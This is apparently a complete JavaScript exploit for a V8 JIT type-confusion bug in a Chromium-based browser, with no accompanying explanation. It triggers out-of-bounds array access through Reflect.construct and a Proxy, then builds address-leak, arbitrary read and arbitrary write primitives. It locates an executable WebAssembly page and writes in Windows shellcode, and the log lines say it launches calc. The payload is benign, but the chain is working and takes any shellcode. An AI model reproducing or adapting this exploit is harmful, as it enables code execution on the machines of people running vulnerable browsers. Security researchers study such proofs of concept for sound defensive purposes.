let a = [0.1,,,,,,,,,,,,,,,,,,,,,,, 0.1, 0.1,0.1];
let oob_arr;
let float_arr;
let obj;
let obj_arr;
let rw_arr;
var buf = new ArrayBuffer(8);
var dataview = new DataView(buf);

a.pop()
a.pop()
a.pop()
 
 
function empty() {}
 
function f(nt) {
    a.push(typeof(Reflect.construct(empty, arguments, nt)) === Proxy ? 0.1 : 7.47707876338752028672E20);
    for (var i = 0; i < 0x10000; ++i) {};
}
 
let p = new Proxy(Object, {
    get: function() {
        a[0] = {}; 
        oob_arr = [0.2, 1.2, 2.2, 3.2, 4.3]; 
 		float_arr = [1.1, 1.2, 1.3, 1.4]; 
		obj = {A : 1};
		obj_arr = [obj]

        return Object.prototype;
    }
}); 
 
function main(p) {
  for (var i = 0; i < 0x10000; ++i) {};
  return f(p);
}
 

function startup(){
	for (var i = 0; i < 0x10000; ++i) { empty(); };
	main(empty);
	main(empty);
	main(p);
}

startup();

float_arr_map = Int64.fromDouble(oob_arr[12])
obj_arr_map = Int64.fromDouble(oob_arr[21])
base_addr = Int64.fromDouble(oob_arr[69]) 
console.log("[+] Float array's map = ", float_arr_map);
console.log("[+] Obj array's map = ", obj_arr_map);
console.log("[+] Base address = ", base_addr);

function addrOf(obj){
	tmp = oob_arr[21];
	obj_arr[0] = obj;
	oob_arr[21] = float_arr_map.asDouble(); 
	offset_addr = Int64.fromDouble(obj_arr[0]); 
	oob_arr[21] = tmp; 

	addr = new Int64('0x' + base_addr.toString().slice(-8) + offset_addr.toString().slice(-8));
	return addr;
}

function read_qword_compress(arb_addr){
	float_arr_addr = addrOf(float_arr);

	elements_pointer_addr = new Int64(parseInt(float_arr_addr) - 0x28);

	addr = new Int64(parseInt(arb_addr) - 0x8 + 1);

	tmp = oob_arr[13];
	oob_arr[13] = addr.asDouble();

	mem_leak = Int64.fromDouble(float_arr[0]);

	oob_arr[13] = tmp;
	return mem_leak;
}

function write_qword_compress(arb_addr, value){
	float_arr_addr = addrOf(float_arr);

	elements_pointer_addr = new Int64(parseInt(float_arr_addr) - 0x28);

	addr = new Int64(parseInt(arb_addr) - 0x8);

	tmp = oob_arr[13];
	oob_arr[13] = addr.asDouble();

	float_arr[0] = value.asDouble();

	oob_arr[13] = tmp;
	return 0;
}


function arb_qword_write(arb_addr, value){
	var buf_addr = addrOf(buf);

	backing_store_addr = new Int64(parseInt(buf_addr) + 0x14);

	write_qword_compress(backing_store_addr, arb_addr); 

	dataview.setBigUint64(0, value, true);
}



var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;


addr = new Int64(parseInt(addrOf(wasm_instance)) + 0x67)
var rwx_page_addr = read_qword_compress(addr);

console.log("[+] RWX Wasm page addr = ", rwx_page_addr);

function copy_shellcode(addr, shell_code) {
	let buf2 = new ArrayBuffer(0x200);
    let dataview2 = new DataView(buf2);
    let buf2_addr = addrOf(buf2);
    let backing_store_addr2 = new Int64(parseInt(buf2_addr) + 0x14 - 1);
    arb_qword_write(backing_store_addr2, addr);
    for (let i = 0; i < shell_code.length; i++) {
		dataview2.setUint32(4*i, shell_code[i], true);
    }
}

console.log("[+] Copying the shellcode");

shell_code = [0xe7894955,0xe48348fc,0x00c0e8f0,0x51410000,0x51525041,0xd2314856,0x528b4865,0x528b4860,0x528b4818,0x728b4820,0xb70f4850,0x314d4a4a,0xc03148c9,0x7c613cac,0x41202c02,0x410dc9c1,0xede2c101,0x48514152,0x8b20528b,0x01483c42,0x88808bd0,0x48000000,0x6774c085,0x50d00148,0x4418488b,0x4920408b,0x56e3d001,0x41c9ff48,0x4888348b,0x314dd601,0xc03148c9,0xc9c141ac,0xc101410d,0xf175e038,0x244c034c,0xd1394508,0x4458d875,0x4924408b,0x4166d001,0x44480c8b,0x491c408b,0x8b41d001,0x01488804,0x415841d0,0x5a595e58,0x59415841,0x83485a41,0x524120ec,0x4158e0ff,0x8b485a59,0xff57e912,0x485dffff,0x000001ba,0x00000000,0x8d8d4800,0x00000101,0x8b31ba41,0xd5ff876f,0xa2b5f0bb,0xa6ba4156,0xff9dbd95,0xc48348d5,0x7c063c28,0xe0fb800a,0x47bb0575,0x6a6f7213,0x894c9000,0x63c35dfc,0x00636c61];
copy_shellcode(rwx_page_addr, shell_code)

console.log("[+] Popping calc");

f();